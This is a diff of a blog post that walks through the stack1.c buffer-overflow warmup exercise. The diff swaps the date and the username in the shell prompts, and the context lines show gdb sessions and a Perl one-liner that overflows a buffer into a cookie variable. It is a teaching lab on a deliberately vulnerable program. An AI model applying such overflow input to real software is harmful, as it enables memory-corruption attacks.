@@ -6,7 +6,7 @@ author: gr0k
 layout: post
 github_comments_issueid: 4
 permalink: /exdev/stack1.html
-date: 27 Aug 2018
+date: 29 Aug 2018
 ---
 stack1.c is the first of the Stack Warmup Exercises. This guide will walk you through the buffer overflow process and explain the details behind what's happening. I ran all of the following on a 64-bit Ubuntu 16.04 box.
 
@@ -56,10 +56,10 @@ Line 14 will print "you win!" if the value of cookie is `0x41424344`. You'll not
 If you followed the [Setup Guide]({{ site.url }}/exdev/intro.html), you can run the stack1 binary from the `InsecureProgramming/bin` directory with `./stack1`.
 
 ```bash
-smith (master) bin $ ./stack1
+6r0k3d (master) bin $ ./stack1
 buf: a091ad20 cookie: a091ad7c
 AAAAA
-smith (master) bin $
+6r0k3d (master) bin $
 ```
 
 As discussed above, the memory addresses for the buf and cookie variables are printed, the program takes input from the user, and then exits.
@@ -260,12 +260,12 @@ Save this to a file and compile it with `gcc -g -o mem_segments mem_segments.c`.
 The code segment, or text section, contains the executable instructions of a program. As a program executes, the instruction pointer (`rip` on x64, `eip` on x86), will point to the memory address of the next instruction to execute. We can see below the machine instruction currently pointed to by `rip` is located at a low memory address of `0x40066e`. We can also see the next instructions that the CPU will execute and their memory addresses.
 
 ```c
-smith Desktop $ gdb -q mem_segments
+6r0k3d Desktop $ gdb -q mem_segments
 Reading symbols from mem_segments...done.
 (gdb) break main
 Breakpoint 1 at 0x40066e: file mem_segments.c, line 12.
 (gdb) run
-Starting program: /home/smith/Desktop/mem_segments
+Starting program: /home/6r0k3d/Desktop/mem_segments
 
 Breakpoint 1, main () at mem_segments.c:12
 12	    int mem_block = 50;
@@ -438,7 +438,7 @@ The first step is when the function gets called. The return address is pushed to
 
 ```c
 (gdb) run
-Starting program: /home/smith/Desktop/mem_segments
+Starting program: /home/6r0k3d/Desktop/mem_segments
 
 Breakpoint 1, main () at mem_segments.c:12
 12	    int mem_block = 50;
@@ -465,7 +465,7 @@ The second step is the execution of the function prologue which sets up the requ
 Breakpoint 6 at 0x4006f1: file mem_segments.c, line 32.
 
 (gdb) run
-Starting program: /home/smith/Desktop/mem_segments
+Starting program: /home/6r0k3d/Desktop/mem_segments
 
 Breakpoint 1, main () at mem_segments.c:12
 12	    int mem_block = 50;
@@ -518,18 +518,18 @@ When we look at the variables in stack1.c, we see we need 80 bytes for our buffe
 Now that we know how far apart the variables are and that `gets()` does not limit user input, we can craft our buffer overflow. We'll need 92 bytes to reach the cookie variable, and then 4 additional bytes to overwrite it. We can use Perl to generate our string.
 
 ```bash
-smith (master *) bin $ perl -e 'print "A"x92 . "ABCD"'
+6r0k3d (master *) bin $ perl -e 'print "A"x92 . "ABCD"'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
 ```
 
 ```c
-smith (master *) bin $ gdb -q stack1
+6r0k3d (master *) bin $ gdb -q stack1
 Reading symbols from stack1...done.
 (gdb) break 12
 Breakpoint 1 at 0x4005e9: file ./exercises/stack1.c, line 12.
 
 (gdb) run
-Starting program: /home/smith/InsecureProgramming/bin/stack1
+Starting program: /home/6r0k3d/InsecureProgramming/bin/stack1
 buf: ffffdd50 cookie: ffffddac
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
 Breakpoint 1, main () at ./exercises/stack1.c:13
@@ -543,7 +543,7 @@ Nothing. We didn't get "you win!". Let's look at why not.
 
 ```c
 (gdb) run
-Starting program: /home/smith/InsecureProgramming/bin/stack1
+Starting program: /home/6r0k3d/InsecureProgramming/bin/stack1
 buf: ffffdd50 cookie: ffffddac
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
 
@@ -565,7 +565,7 @@ Breakpoint 1, main () at ./exercises/stack1.c:13
 We can see at breakpoint 1, cookie has to equal `0x41424344`. When we look at memory, we see the buffer has overflowed into cookie with `0x44434241`. This, as you may have guessed, is because of the endianness. We need to reverse the letters in our buffer.
 
 ```bash
-smith (master *) bin $ perl -e 'print "A"x92 . "DCBA"'
+6r0k3d (master *) bin $ perl -e 'print "A"x92 . "DCBA"'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA
 ```
 
@@ -573,7 +573,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 (gdb) run
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/smith/InsecureProgramming/bin/stack1
+Starting program: /home/6r0k3d/InsecureProgramming/bin/stack1
 buf: ffffdd50 cookie: ffffddac
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA
 
